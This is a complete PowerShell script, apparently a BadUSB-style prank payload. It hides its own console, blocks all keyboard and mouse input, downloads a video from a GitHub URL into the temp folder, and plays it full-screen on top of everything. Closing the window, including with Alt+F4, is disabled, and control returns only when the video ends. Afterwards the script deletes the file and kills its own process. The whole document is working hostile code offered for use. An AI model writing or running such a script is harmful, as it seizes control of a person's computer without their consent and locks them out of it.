try {
    # 1. API for Hiding Window and Blocking Input
    $c = @'
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);
    [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
'@
    $t = Add-Type -MemberDefinition $c -Name "Win32" -Namespace "Win" -PassThru
    
    # Hide Console
    $t::ShowWindow((Get-Process -Id $pid).MainWindowHandle, 0) | Out-Null
    
    # BLOCK KEYBOARD AND MOUSE
    $t::BlockInput($true)
} catch {}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type -AssemblyName PresentationFramework,PresentationCore,WindowsBase

$u = 'https://github.com/ymkeee/T-Embed/raw/refs/heads/main/edit.mp4'
$f = "$env:TEMP\payload_video.mp4"

try {
    Invoke-WebRequest -Uri $u -OutFile $f -ErrorAction Stop

    $xaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        WindowStyle="None" WindowState="Maximized" Topmost="True" 
        Background="Black" Cursor="None" ShowInTaskbar="False">
    <Grid><MediaElement Name="v" Source="$f" LoadedBehavior="Play" Stretch="Uniform" /></Grid>
</Window>
"@

    $reader = New-Object System.Xml.XmlNodeReader ([xml]$xaml)
    $w = [Windows.Markup.XamlReader]::Load($reader)
    $v = $w.FindName("v")

    # When video ends: Unblock input and close
    $v.add_MediaEnded({
        $t::BlockInput($false)
        $w.Close()
    })

    # Block Alt+F4
    $w.Add_Closing({
        $_.Cancel = $true
    })

    $w.ShowDialog() | Out-Null
} 
catch {
    # If error occurs, ensure keyboard is unblocked before exit
    if ($t) { $t::BlockInput($false) }
    exit
}
finally {
    # Safety Unblock
    if ($t) { $t::BlockInput($false) }
    Start-Sleep -Seconds 1
    if (Test-Path $f) { Remove-Item $f -Force -ErrorAction SilentlyContinue }
    Stop-Process -Id $pid -Force
}
